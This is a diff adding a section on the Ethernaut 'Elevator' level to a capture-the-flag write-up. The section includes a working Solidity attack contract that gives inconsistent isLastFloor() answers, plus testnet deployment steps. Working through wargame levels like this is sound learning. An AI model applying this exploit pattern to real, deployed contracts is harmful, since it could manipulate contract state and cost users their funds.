@@ -579,3 +579,84 @@ Once the balance reached `0`, I confirmed the attack was successful.
 ![Level Complete Output](assets/Re-entracy.png)
 ![Level Complete Output](assets/Re-entrancy(1).png)
 
+
+# Ethernaut Level 11: Elevator
+
+## Strategy
+
+- **Vulnerability**: The `Elevator` contract relies on an external `Building` contract's `isLastFloor()` function, calling it **twice** — once in an `if` condition and again to set `top`. Since both calls are made separately, the return values don’t have to be the same, creating a logic loophole.
+- **Exploit**: I created a contract (`ElevatorHack`) that:
+  1. Implements the `Building` interface.
+  2. Returns `false` on the first call to `isLastFloor()`, and `true` on the second call — using a toggle variable.
+- **Outcome**: This tricks the `Elevator` into thinking it's not on the last floor, then immediately believing it is — allowing me to set `top = true` and complete the level.
+
+```
+// SPDX-License-Identifier: MIT 
+pragma solidity ^0.8.0;
+
+interface Elevator {
+    function goTo(uint256 _floor) external;
+}
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract ElevatorHack is Building {
+    bool public toggle;
+    Elevator public target;
+
+    constructor(address _target) {
+        target = Elevator(_target);
+        toggle = true;
+    }
+
+    function isLastFloor(uint256) external override returns (bool) {
+        toggle = !toggle; // returns false first, then true
+        return toggle;
+    }
+
+    function attack() public {
+        target.goTo(1);
+    }
+}
+```
+
+---
+
+### Compiled the Contract
+
+- I used the Solidity compiler version `^0.8.0` to match the challenge.
+- Clicked **Compile ElevatorHack.sol**.
+
+---
+
+### Deployed the Hack Contract
+
+- Switched Remix to **Injected Provider** (MetaMask on Sepolia).
+- Passed the instance address of the vulnerable `Elevator` contract into the constructor.
+- Deployed `ElevatorHack`.
+
+---
+
+### Triggered the Exploit
+
+- Clicked the `attack()` function in the deployed `ElevatorHack` contract.
+- This called `goTo(1)` and toggled the return values of `isLastFloor()` to fake the logic and trick the contract.
+
+---
+
+### Verified the Result
+
+In the browser console, I checked:
+```
+await contract.top()
+```
+**→ Output**: `true`
+
+This confirmed that the Elevator believed it had reached the top.
+
+---
+
+## Level Completed
+![Level Complete Output](assets/Elevator.png)
